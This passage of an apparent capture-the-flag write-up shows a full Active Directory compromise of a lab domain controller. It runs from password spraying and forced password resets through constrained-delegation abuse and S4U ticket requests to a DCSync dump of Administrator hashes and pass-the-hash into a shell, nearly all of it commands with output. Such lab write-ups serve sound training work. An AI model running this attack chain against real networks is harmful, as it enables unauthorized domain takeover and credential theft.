SMB         10.129.18.99    445    DC               [-] redelegate.vl\Administrator:Autumn2025! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Guest:Autumn2025! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\krbtgt:Autumn2025! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Christine.Flanders:Autumn2025! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Helen.Frost:Autumn2025! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Michael.Pontiac:Autumn2025! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Mallory.Roberts:Autumn2025! STATUS_ACCOUNT_RESTRICTION    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\James.Dinkleberg:Autumn2025! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Helpdesk:Autumn2025! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\IT:Autumn2025! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Finance:Autumn2025! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Ryan.Cooper:Autumn2025! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\sql_svc:Autumn2025! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Administrator:Winter2025! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Guest:Winter2025! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\krbtgt:Winter2025! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Christine.Flanders:Winter2025! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Helen.Frost:Winter2025! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Michael.Pontiac:Winter2025! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Mallory.Roberts:Winter2025! STATUS_ACCOUNT_RESTRICTION    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\James.Dinkleberg:Winter2025! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Helpdesk:Winter2025! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\IT:Winter2025! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Finance:Winter2025! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Ryan.Cooper:Winter2025! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\sql_svc:Winter2025! STATUS_LOGON_FAILURE
```

We got  `STATUS_ACCOUNT_RESTRICTION` on `Mallory.Roberts` and
`[+] redelegate.vl\Marie.Curie:Fall2024!`.

That's our first user.

```bash
>  nxc smb redelegate.vl -u Marie.Curie -p 'Fall2024!' --shares  
SMB         10.129.18.99    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.18.99    445    DC               [+] redelegate.vl\Marie.Curie:Fall2024!    
SMB         10.129.18.99    445    DC               [*] Enumerated shares  
SMB         10.129.18.99    445    DC               Share           Permissions     Remark  
SMB         10.129.18.99    445    DC               -----           -----------     ------  
SMB         10.129.18.99    445    DC               ADMIN$                          Remote Admin  
SMB         10.129.18.99    445    DC               C$                              Default share  
SMB         10.129.18.99    445    DC               IPC$            READ            Remote IPC  
SMB         10.129.18.99    445    DC               NETLOGON        READ            Logon server share    
SMB         10.129.18.99    445    DC               SYSVOL          READ            Logon server share    
>  nxc winrm redelegate.vl -u Marie.Curie -p 'Fall2024!'  
WINRM       10.129.18.99    5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl)    
WINRM       10.129.18.99    5985   DC               [-] redelegate.vl\Marie.Curie:Fall2024!
```

We got `READ` on `NETLOGON` and `SYSVOL` which isn't much but it's a good start.

```bash
>  smbclient //redelegate.vl/SYSVOL -U Marie.Curie%Fall2024!  
Try "help" to get a list of possible commands.  
smb: \> ls  
 .                                   D        0  Sat Oct 19 10:00:57 2024  
 ..                                  D        0  Sat Oct 19 10:00:57 2024  
 redelegate.vl                      Dr        0  Sat Oct 19 10:00:57 2024  
  
               5048575 blocks of size 4096. 1029828 blocks available  
smb: \> cd redelegate.vl  
smb: \redelegate.vl\> ls  
 .                                   D        0  Sat Oct 19 10:07:09 2024  
 ..                                  D        0  Sat Oct 19 10:00:57 2024  
 DfsrPrivate                      DHSr        0  Sat Oct 19 10:07:09 2024  
 Policies                            D        0  Sat Oct 19 10:01:03 2024  
 scripts                             D        0  Sat Oct 19 10:00:57 2024
 
 >  smbclient //redelegate.vl/NETLOGON -U Marie.Curie%Fall2024!  
Try "help" to get a list of possible commands.  
smb: \> ls  
 .                                   D        0  Sat Oct 19 10:00:57 2024  
 ..                                  D        0  Sat Oct 19 10:07:09 2024  
  
               5048575 blocks of size 4096. 1029828 blocks available
```

And it seems empty.

We'll try `ldapsearch` to find which group `Marie.Curie` belongs to :

```bash
>  ldapsearch -x -H ldap://redelegate.vl -D 'Marie.Curie@redelegate.vl' -w 'Fall2024!' -b 'DC=redelegate,DC=vl' '(sAMAccountName=Marie.Curie)' memberOf  
  
# extended LDIF  
#  
# LDAPv3  
# base <DC=redelegate,DC=vl> with scope subtree  
# filter: (sAMAccountName=Marie.Curie)  
# requesting: memberOf    
#  
  
# Marie.Curie, Users, redelegate.vl  
dn: CN=Marie.Curie,CN=Users,DC=redelegate,DC=vl  
memberOf: CN=Helpdesk,CN=Users,DC=redelegate,DC=vl  
  
# search reference  
ref: ldap://ForestDnsZones.redelegate.vl/DC=ForestDnsZones,DC=redelegate,DC=vl  
  
# search reference  
ref: ldap://DomainDnsZones.redelegate.vl/DC=DomainDnsZones,DC=redelegate,DC=vl  
  
# search reference  
ref: ldap://redelegate.vl/CN=Configuration,DC=redelegate,DC=vl  
  
# search result  
search: 2  
result: 0 Success  
  
# numResponses: 5  
# numEntries: 1  
# numReferences: 3
```

`memberOf: CN=Helpdesk,CN=Users`

We'll go on `bloodhound` to figure out if we have Outbound Privileges from now on.

```bash
>  rm -rf *bloodhound.zip
```

For a quick cleanup of previous databases, but we can use `/usr/bin/bloodyad` first.

```bash
>  /usr/bin/bloodyad --host dc.redelegate.vl -d redelegate.vl -u Marie.Curie -p 'Fall2024!' get writable  
  
distinguishedName: CN=Guest,CN=Users,DC=redelegate,DC=vl  
permission: WRITE  
  
distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=redelegate,DC=vl  
permission: WRITE  
  
distinguishedName: CN=Christine.Flanders,CN=Users,DC=redelegate,DC=vl  
permission: WRITE  
  
distinguishedName: CN=Marie.Curie,CN=Users,DC=redelegate,DC=vl  
permission: WRITE  
  
distinguishedName: CN=Helen.Frost,CN=Users,DC=redelegate,DC=vl  
permission: WRITE  
  
distinguishedName: CN=Michael.Pontiac,CN=Users,DC=redelegate,DC=vl  
permission: WRITE  
  
distinguishedName: CN=James.Dinkleberg,CN=Users,DC=redelegate,DC=vl  
permission: WRITE  
  
distinguishedName: CN=sql_svc,CN=Users,DC=redelegate,DC=vl  
permission: WRITE  
  
distinguishedName: DC=_msdcs.redelegate.vl,CN=MicrosoftDNS,DC=ForestDnsZones,DC=redelegate,DC=vl  
permission: CREATE_CHILD
```

So we have `permission : WRITE` on `Christine.Flanders, Helen.Frost, Michael.Pontiac and James.Dinkleberg` and `CREATE_CHILD` on `msdcs`.

We get a `Ticket Granting Ticket (TGT)` for `Marie.Curie` :

```bash
>  getTGT.py redelegate.vl/Marie.Curie:'Fall2024!'  
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies    
  
[*] Saving ticket in Marie.Curie.ccache
```

Then we export the `credential cache` to `KRB5CCNAME` :

```bash
>  export KRB5CCNAME=$PWD/Marie.Curie.ccache
```

We use `bloodyAD` with our rights as `Marie.Curie` to set a new password for these users :

```bash
>  /usr/bin/bloodyad -d redelegate.vl -k --host dc.redelegate.vl set password Christine.Flanders 'Scrow1&'  
[+] Password changed successfully!  
>  /usr/bin/bloodyad -d redelegate.vl -k --host dc.redelegate.vl set password Helen.Frost 'Scrow1&'  
[+] Password changed successfully!  
>  /usr/bin/bloodyad -d redelegate.vl -k --host dc.redelegate.vl set password James.Dinkleberg 'Scrow1&'  
[+] Password changed successfully!  
>  /usr/bin/bloodyad -d redelegate.vl -k --host dc.redelegate.vl set password Michael.Pontiac 'Scrow1&'
```

Then, we spray into `netexec winrm` :

```bash 
>  sudo nano /tmp/dlist.txt  
Please touch the FIDO authenticator.  
>  cat /tmp/dlist.txt  
Christine.Flanders  
Helen.Frost  
James.Dinkleberg  
Michael.Pontiac  
 
>  nxc winrm redelegate.vl -u /tmp/dlist.txt -p 'Scrow1&'  
WINRM       10.129.18.99    5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl)    
WINRM       10.129.18.99    5985   DC               [-] redelegate.vl\Christine.Flanders:Scrow1&  
WINRM       10.129.18.99    5985   DC               [+] redelegate.vl\Helen.Frost:Scrow1& (Pwn3d!)  
>  nxc winrm redelegate.vl -u /tmp/dlist.txt -p 'Scrow1&' --continue-on-success  
WINRM       10.129.18.99    5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl)    
WINRM       10.129.18.99    5985   DC               [-] redelegate.vl\Christine.Flanders:Scrow1&  
WINRM       10.129.18.99    5985   DC               [+] redelegate.vl\Helen.Frost:Scrow1& (Pwn3d!)  
WINRM       10.129.18.99    5985   DC               [-] redelegate.vl\James.Dinkleberg:Scrow1& 
```

So the only shell we got is `Helen.Frost`.

```bash
>  evil-winrm -i redelegate.vl -u Helen.Frost -p 'Scrow1&'  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining 'object_id' may cause serious problems  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining 'object_id' may cause serious problems  
/usr/lib/ruby/3.4.0/readline.rb:4: warning: reline was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 4.0.0.  
You can add reline to your Gemfile or gemspec to silence this warning.  
                                          
Evil-WinRM shell v3.9  
                                          
Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline  
                                          
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion  
                                          
Info: Establishing connection to remote endpoint  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
*Evil-WinRM* PS C:\Users\Helen.Frost\Documents> type /Users/Helen.Frost/Desktop/user.txt  
[REDACTED]
```

User flag.

Now, we proceed to privesc.

```bash
*Evil-WinRM* PS C:\Users\Helen.Frost\Documents> whoami /priv  
  
PRIVILEGES INFORMATION  
----------------------  
  
Privilege Name                Description                                                    State  
============================= ============================================================== =======  
SeMachineAccountPrivilege     Add workstations to domain                                     Enabled  
SeChangeNotifyPrivilege       Bypass traverse checking                                       Enabled  
SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation Enabled  
SeIncreaseWorkingSetPrivilege Increase a process working set                                 Enabled  
*Evil-WinRM* PS C:\Users\Helen.Frost\Documents> whoami /groups  
  
GROUP INFORMATION  
-----------------  
  
Group Name                                  Type             SID                                            Attributes  
=========================================== ================ ============================================== ==================================================  
Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group  
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group  
BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group  
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group  
REDELEGATE\IT                               Group            S-1-5-21-4024337825-2033394866-2055507597-1113 Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group  
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
```

We can see we have `SeEnableDelegationPrivilege` and we're part of the group `REDELEGATE\IT`.

We'll create another `Ticket Granting Ticket` with `Helen.Frost` and export it again for `bloodyAD` :

```bash
>  getTGT.py redelegate.vl/Helen.Frost:'Scrow1&'  
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies    
  
[*] Saving ticket in Helen.Frost.ccache  
>  export KRB5CCNAME=$PWD/Helen.Frost.ccache
```

And we use `/usr/bin/bloodyad` again, this time with `Helen.Frost` registered :

```bash
>  /usr/bin/bloodyad --host dc.redelegate.vl -d redelegate.vl -k get writable  
  
distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=redelegate,DC=vl  
permission: WRITE  
  
distinguishedName: CN=FS01,CN=Computers,DC=redelegate,DC=vl  
permission: CREATE_CHILD; WRITE  
OWNER: WRITE  
DACL: WRITE  
  
distinguishedName: CN=Helen.Frost,CN=Users,DC=redelegate,DC=vl  
permission: WRITE  
  
distinguishedName: DC=_msdcs.redelegate.vl,CN=MicrosoftDNS,DC=ForestDnsZones,DC=redelegate,DC=vl  
permission: CREATE_CHILD
```

We have the same `CREATE_CHILD` right as `Marie.Curie` on `msdcs` and also on `Computers` and `permisson : WRITE` on `Computers`, `Users`, `ForeignSecurityPrincipals` as well as `OWNER: WRITE and DACL: WRITE` on `Computers`.

The `name` for the `Computers` account is `FS01` but since this is a `machine account` and not a `user account`, we'll modify the password with our `WRITE` right adding an `$` at the end.

```bash
>  /usr/bin/bloodyad -d redelegate.vl -k --host dc.redelegate.vl set password 'FS01$' 'Scrow1&'  
[+] Password changed successfully!
```

We'll verify with netexec on SMB first :

```bash
>  nxc smb 10.129.18.99 -u 'FS01$' -p 'Scrow1&' --shares  
  
SMB         10.129.18.99    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.18.99    445    DC               [+] redelegate.vl\FS01$:Scrow1&    
SMB         10.129.18.99    445    DC               [*] Enumerated shares  
SMB         10.129.18.99    445    DC               Share           Permissions     Remark  
SMB         10.129.18.99    445    DC               -----           -----------     ------  
SMB         10.129.18.99    445    DC               ADMIN$                          Remote Admin  
SMB         10.129.18.99    445    DC               C$                              Default share  
SMB         10.129.18.99    445    DC               IPC$            READ            Remote IPC  
SMB         10.129.18.99    445    DC               NETLOGON        READ            Logon server share    
SMB         10.129.18.99    445    DC               SYSVOL          READ            Logon server share
```

It has the same share rights as the other users, so we'll add `constrained delegation` via Helen.Frost's `SeEnableDelegationPrivilege` which might lead to us requesting a ticket for the Domain Administrator if we abuse it correctly.

We'll add to the Computers' `uac (User Account Control)` the `TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION` `-f` flag  :

```bash
>  /usr/bin/bloodyad -d redelegate.vl -k --host dc.redelegate.vl add uac 'FS01$' -f TRUSTED_TO_AUTH_FOR_DELEGATION  
[+] ['TRUSTED_TO_AUTH_FOR_DELEGATION'] property flags added to FS01$'s userAccountControl
```

We'll then allow `FSO1$` to delegate to a `common internet file system` :

```bash
>  /usr/bin/bloodyad -d redelegate.vl -k --host dc.redelegate.vl set object 'FS01$' msDS-AllowedToDelegateTo -v 'cifs/dc.redelegate.vl'  
[+] FS01$'s msDS-AllowedToDelegateTo has been updated
```

Then use `get Service Ticket` using Impacket with a `Service Principal Name` with `-spn cifs` to impersonate `dc` :

```bash
>  getST.py 'redelegate.vl/FS01$:Scrow1&' -spn cifs/dc.redelegate.vl -impersonate dc  
  
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies    
  
[-] CCache file is not found. Skipping...  
[*] Getting TGT for user  
[*] Impersonating dc  
[*] Requesting S4U2self  
[*] Requesting S4U2Proxy  
[*] Saving ticket in dc@cifs_dc.redelegate.vl@REDELEGATE.VL.ccache
```

Then, we'll point the `KRB5CCNAME` at the dc's ticket :

```bash
export KRB5CCNAME="$PWD/dc@cifs_dc.redelegate.vl@REDELEGATE.VL.ccache"
```

And try to impersonate Administrator via DCSync :

```bash
>  secretsdump.py -k -no-pass dc.redelegate.vl -just-dc-user Administrator  
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies    
  
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)  
[*] Using the DRSUAPI method to get NTDS.DIT secrets  
Administrator:500:[REDACTED]:::  
[*] Kerberos keys grabbed  
Administrator:aes256-cts-hmac-sha1-96:[REDACTED]  
Administrator:aes128-cts-hmac-sha1-96:[REDACTED]  
Administrator:des-cbc-md5:102f86737c3e9b2f  
[*] Cleaning up...
```

We got a hash for Administrator ! `[REDACTED]` is the `NT` hash from the `LM:NT` we got which means we can use Pass-The-Hash and go directly to the shell, we verify :

```bash
>  nxc winrm redelegate.vl -u Administrator -H '[REDACTED]'  
WINRM       10.129.18.99    5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl)    
WINRM       10.129.18.99    5985   DC               [+] redelegate.vl\Administrator:[REDACTED] (Pwn3d!)
```

And we got it !

```bash
>  evil-winrm -i redelegate.vl -u Administrator -H '[REDACTED]'  
  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining 'object_id' may cause serious problems  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining 'object_id' may cause serious problems  
/usr/lib/ruby/3.4.0/readline.rb:4: warning: reline was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 4.0.0.  
You can add reline to your Gemfile or gemspec to silence this warning.  
                                          
Evil-WinRM shell v3.9  
                                          
Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline  
                                          
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion  
                                          
Info: Establishing connection to remote endpoint  
*Evil-WinRM* PS C:\Users\Administrator\Documents> type /Users/Administrator/Desktop/root.txt  
[REDACTED]
```

First Hard box rooted !
